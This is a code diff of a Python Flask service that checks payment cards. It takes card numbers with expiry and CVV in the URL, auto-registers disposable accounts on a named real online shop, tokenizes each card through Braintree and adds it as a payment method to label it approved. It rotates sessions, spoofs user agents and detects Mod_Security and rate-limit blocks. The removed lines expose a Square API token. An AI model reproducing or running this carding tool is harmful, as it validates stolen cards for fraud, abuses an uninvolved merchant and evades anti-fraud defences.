@@ -1,23 +1,106 @@
 from flask import Flask, jsonify
 import requests
-import json
-from fake_useragent import UserAgent
-import base64
 import re
-from bs4 import BeautifulSoup
+import base64
 import random
 import string
+import json
+import pickle
+import http.cookiejar
+from fake_useragent import UserAgent
+import os
+import logging
 
 app = Flask(__name__)
 
-# Square API token and merchant ID (replace with your own for production)
-SQUARE_API_TOKEN = "Bearer EAAAEJ2eG0hY3T2v0iPyJaNbb2ieD9Tp0d20tQkxOenoKBkhfgWN0HCGCTm1BlI9"
-SQUARE_MERCHANT_ID = "ML6G63F2K7BGC"
+# Configure logging
+logging.basicConfig(level=logging.DEBUG)
+logger = logging.getLogger(__name__)
 
-@app.route('/gateway=square/cc=<card_details>', methods=['GET'])
-def square_payment(card_details):
+# Initialize user agent
+ua = UserAgent()
+user_agent = ua.random
+
+# Constants from chk function
+VARPS = ['H1', 'H2', 'H3', 'H4', 'H5', 'H6', 'H7', 'H8', 'H9', 'H10']
+CORR = 'bcgvcdc'
+SESS = 'vsgvxdf'
+
+def up(varp):
+    """Register a new account and fetch Braintree client token."""
+    r = requests.session()
+    name = ''.join(random.choices(string.ascii_lowercase, k=15))
+    acc = f"{name}@closetab.com"
+    headers = {'user-agent': user_agent}
+
     try:
-        # Parse card details from URL path
+        # Step 1: Fetch registration page
+        response = r.get('https://bayoulandleather.com/my-account/', headers=headers, timeout=10)
+        if response.status_code != 200:
+            logger.error(f"Failed to fetch registration page: status {response.status_code}")
+            return None, None, None
+
+        # Extract nonce
+        nonce_match = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', response.text)
+        if not nonce_match:
+            logger.error("Failed to extract woocommerce-register-nonce")
+            return None, None, None
+        nonce = nonce_match.group(1)
+
+        # Step 2: Register account
+        data = {
+            'email': acc,
+            'wc_order_attribution_user_agent': user_agent,
+            'woocommerce-register-nonce': nonce,
+            '_wp_http_referer': 'https://bayoulandleather.com/my-account/add-payment-method/',
+            'register': 'Register',
+        }
+        response = r.post('https://bayoulandleather.com/my-account/add-payment-method/', headers=headers, data=data, timeout=10)
+        if response.status_code not in (200, 201):
+            logger.error(f"Failed to register account: status {response.status_code}")
+            return None, None, None
+
+        # Extract Braintree client token and nonce
+        enc_match = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text)
+        add_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', response.text)
+        if not enc_match or not add_nonce_match:
+            logger.error("Failed to extract client token or add-payment-method nonce")
+            return None, None, None
+
+        enc = enc_match.group(1)
+        add_nonce = add_nonce_match.group(1)
+        dec = base64.b64decode(enc).decode('utf-8')
+        au = re.findall(r'"authorizationFingerprint":"([^"]+)"', dec)[0]
+
+        # Save to gates.json
+        gates_data = {}
+        if os.path.exists('gates.json'):
+            with open('gates.json', 'r') as json_file:
+                gates_data = json.load(json_file)
+
+        new_data = {varp: {"nonce": add_nonce, "au": au}}
+        if 'chk' in gates_data:
+            gates_data['chk'].update(new_data)
+        else:
+            gates_data['chk'] = new_data
+
+        with open('gates.json', 'w') as json_file:
+            json.dump(gates_data, json_file, ensure_ascii=False, indent=4)
+
+        # Save cookies
+        with open(f'chk_{varp}.pkl', 'wb') as f:
+            pickle.dump(r.cookies, f)
+
+        return add_nonce, au, r.cookies
+
+    except Exception as e:
+        logger.error(f"Error in up function: {str(e)}")
+        return None, None, None
+
+@app.route('/gateway=b3/cc=<card_details>', methods=['GET'])
+def braintree_payment(card_details):
+    try:
+        # Parse card details
         card_data = card_details.split('|')
         if len(card_data) != 4:
             return jsonify({"error": "Invalid card format. Use number|exp_month|exp_year|cvv"}), 400
@@ -32,146 +115,145 @@ def square_payment(card_details):
         if len(exp_year) == 2:
             exp_year = f"20{exp_year}"
 
-        # Generate random user agent
-        ua = UserAgent()
-        user_agent = ua.random
+        # Load or initialize gates.json
+        gates_data = {}
+        if os.path.exists('gates.json'):
+            with open('gates.json', 'r') as file:
+                gates_data = json.load(file)
 
-        # Step 1: Get client token from codeofharmony.com
-        headers = {
-            'authority': 'codeofharmony.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'referer': 'https://codeofharmony.com/my-account/add-payment-method/',
-            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': user_agent,
-        }
+        # Select a random varp and check for existing session
+        last_varp = None
+        if os.path.exists('last_varp.txt'):
+            with open('last_varp.txt', 'r') as file:
+                last_varp = file.readline().strip()
 
-        response = requests.get('https://codeofharmony.com/my-account/add-payment-method/', headers=headers)
-        if response.status_code != 200:
-            return jsonify({"error": "Failed to fetch client token page"}), 500
+        while True:
+            varp = random.choice(VARPS)
+            if varp != last_varp:
+                break
 
-        # Extract nonce and client token
-        nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
-        client_token_match = re.search(r'client_token_nonce":"(.*?)"', response.text)
-        if not nonce_match or not client_token_match:
-            return jsonify({"error": "Failed to extract nonce or client token"}), 500
+        # Save current varp
+        with open('last_varp.txt', 'w') as file:
+            file.write(varp)
 
-        nonce = nonce_match.group(1)
-        client_token_nonce = client_token_match.group(1)
+        # Load session data
+        nonce, au, cookies = None, None, None
+        try:
+            if 'chk' in gates_data and varp in gates_data['chk']:
+                nonce = gates_data['chk'][varp]['nonce']
+                au = gates_data['chk'][varp]['au']
+                with open(f'chk_{varp}.pkl', 'rb') as f:
+                    cookies = pickle.load(f)
+        except Exception as e:
+            logger.warning(f"Failed to load session for {varp}: {str(e)}")
 
-        # Step 2: Get Square client token
-        headers = {
-            'authority': 'codeofharmony.com',
+        # If session data is missing, register a new account
+        if not all([nonce, au, cookies]):
+            nonce, au, cookies = up(varp)
+            if not all([nonce, au, cookies]):
+                return jsonify({"error": "Failed to register account or fetch session data"}), 500
+
+        # Step 1: Tokenize credit card with Braintree
+        header = {
             'accept': '*/*',
-            'accept-language': 'en-US,en;q=0.9',
-            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'origin': 'https://codeofharmony.com',
-            'referer': 'https://codeofharmony.com/my-account/add-payment-method/',
-            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': user_agent,
-            'x-requested-with': 'XMLHttpRequest',
-        }
-
-        data = {'action': 'wc_square_credit_card_get_client_token', 'nonce': client_token_nonce}
-        response = requests.post('https://codeofharmony.com/wp-admin/admin-ajax.php', headers=headers, data=data)
-        if response.status_code != 200 or not response.json().get('success'):
-            return jsonify({"error": "Failed to get Square client token", "details": response.text}), 500
-
-        encoded_text = response.json()['data']
-        decoded_text = base64.b64decode(encoded_text).decode('utf-8')
-        application_id = re.findall(r'"applicationId":"(.*?)"', decoded_text)[0]
-
-        # Step 3: Generate Square nonce
-        headers = {
-            'authority': 'connect.squareup.com',
-            'accept': 'application/json',
-            'accept-language': 'en-US,en;q=0.9',
-            'authorization': SQUARE_API_TOKEN,
+            'authorization': f'Bearer {au}',
+            'braintree-version': '2018-05-10',
             'content-type': 'application/json',
-            'origin': 'https://codeofharmony.com',
-            'referer': 'https://codeofharmony.com/',
-            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'cross-site',
+            'Pragma': 'no-cache',
             'user-agent': user_agent,
         }
-
         json_data = {
-            'sourceId': f'cnon:{":".join([random.choice(string.ascii_letters + string.digits) for _ in range(16)])}',
-            'verificationToken': None,
-            'idempotencyKey': f'codeofharmony-{random.randint(100000, 999999)}',
-            'card': {
-                'billingAddress': {'postalCode': '10003'},
-                'cardholderName': 'Test User',
-                'expMonth': exp_month,
-                'expYear': exp_year,
-                'number': card_number,
-                'cvv': cvv,
+            'clientSdkMetadata': {
+                'source': 'client',
+                'integration': 'custom',
+                'sessionId': 'accd43a0-58d1-493b-94a9-76bb1a2fa359',
             },
-            'locationId': SQUARE_MERCHANT_ID,
+            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
+            'variables': {
+                'input': {
+                    'creditCard': {
+                        'number': card_number,
+                        'expirationMonth': exp_month,
+                        'expirationYear': exp_year,
+                        'cvv': cvv,
+                        'billingAddress': {
+                            'postalCode': '90011',
+                            'streetAddress': '',
+                        },
+                    },
+                    'options': {
+                        'validate': False,
+                    },
+                },
+            },
+            'operationName': 'TokenizeCreditCard',
         }
 
-        response = requests.post('https://connect.squareup.com/v2/card-nonces', headers=headers, json=json_data)
+        response = requests.post('https://payments.braintree-api.com/graphql', headers=header, json=json_data, timeout=10)
         if response.status_code != 200:
-            return jsonify({"error": "Failed to generate Square nonce", "details": response.text}), 500
+            logger.error(f"Failed to tokenize card: status {response.status_code}, response {response.text[:200]}")
+            return jsonify({"error": "Failed to tokenize card", "details": response.text[:200]}), 500
 
         try:
-            nonce = response.json()['card_nonce']['nonce']
+            tok = response.json()['data']['tokenizeCreditCard']['token']
         except KeyError:
-            return jsonify({"error": "Failed to extract nonce from Square response", "details": response.json()}), 500
+            logger.error(f"Failed to extract token: {response.json()}")
+            # Retry by registering new accounts for all varps
+            for v in VARPS:
+                up(v)
+            return jsonify({"error": "Failed to extract token, retried registration", "details": response.json()}), 500
 
-        # Step 4: Add payment method
-        headers = {
-            'authority': 'codeofharmony.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://codeofharmony.com',
-            'referer': 'https://codeofharmony.com/my-account/add-payment-method/',
-            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': user_agent,
-        }
-
+        # Step 2: Add payment method
+        r = requests.session()
+        r.cookies = cookies
+        headers = {'user-agent': user_agent}
         data = {
-            'payment_method': 'square_credit_card',
-            'wc-square-credit-card-payment-nonce': nonce,
-            'wc-square-credit-card-payment-token': '0',
+            'payment_method': 'braintree_cc',
+            'braintree_cc_nonce_key': tok,
+            'braintree_cc_device_data': f'{{"device_session_id":"{SESS}","fraud_merchant_id":null,"correlation_id":"{CORR}"}}',
+            'braintree_cc_3ds_nonce_key': '',
+            'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/bxynhfj8s242wzvz/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/bxynhfj8s242wzvz"},"merchantId":"bxynhfj8s242wzvz","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":false}',
             'woocommerce-add-payment-method-nonce': nonce,
             '_wp_http_referer': '/my-account/add-payment-method/',
             'woocommerce_add_payment_method': '1',
         }
 
-        response = requests.post('https://codeofharmony.com/my-account/add-payment-method/', headers=headers, data=data)
-        if 'Payment method successfully added.' in response.text:
+        response = r.post(
+            'https://bayoulandleather.com/my-account/add-payment-method/',
+            cookies=r.cookies,
+            headers=headers,
+            data=data,
+            timeout=10
+        )
+        text = response.text
+
+        # Parse response
+        if 'Payment method successfully added.' in text:
             return jsonify({"status": "1000: Approved"})
 
-        # Extract error message if any
-        soup = BeautifulSoup(response.text, 'html.parser')
-        error_message = soup.find('div', class_='woocommerce-notices-wrapper')
-        if error_message:
-            return jsonify({"status": error_message.text.strip()})
+        if '<head><title>Not Acceptable!</title>' in text:
+            logger.warning("Mod_Security error detected")
+            return jsonify({"status": "RISK: Retry this BIN later"})
 
-        return jsonify({"status": "Unknown error occurred"})
+        if 'risk_threshold' in text or 'Please wait for 20 seconds' in text:
+            logger.info("Risk threshold or rate limit detected")
+            return jsonify({"status": "RISK: Retry this BIN later"})
+
+        pattern = r'Reason: (.+?)\s*</li>'
+        match = re.search(pattern, text)
+        if match:
+            result = match.group(1)
+            if any(x in result for x in ['avs', 'Invalid postal code', 'Insufficient Funds']):
+                return jsonify({"status": "Approved"})
+            return jsonify({"status": result})
+
+        logger.warning("No specific error message found, retrying registration")
+        for v in VARPS:
+            up(v)
+        return jsonify({"status": "RISK: Retry this BIN later"})
 
     except Exception as e:
+        logger.error(f"Unexpected error: {str(e)}")
         return jsonify({"error": str(e)}), 500
 
 if __name__ == '__main__':
